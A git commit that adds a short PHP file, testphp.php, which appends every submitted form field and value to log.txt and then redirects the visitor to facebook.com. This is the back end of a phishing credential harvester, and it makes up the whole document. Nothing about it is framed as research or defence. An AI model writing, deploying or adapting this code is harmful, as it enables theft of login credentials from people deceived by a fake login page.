1becb05302cb5681d7599efd1109b22de589351c
Biancano <bebostunner234@gmail.com>
2017-10-06 19:18:39 -0700

    Create testphp.php

---
+++ testphp.php
@@ -0,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<?php
+header ('Location: http://www.facebook.com');
+$handle = fopen("log.txt", "a");
+foreach($_POST as $variable => $value) {
+   fwrite($handle, $variable);
+   fwrite($handle, "=");
+   fwrite($handle, $value);
+   fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+exit;
+?>
+</html>
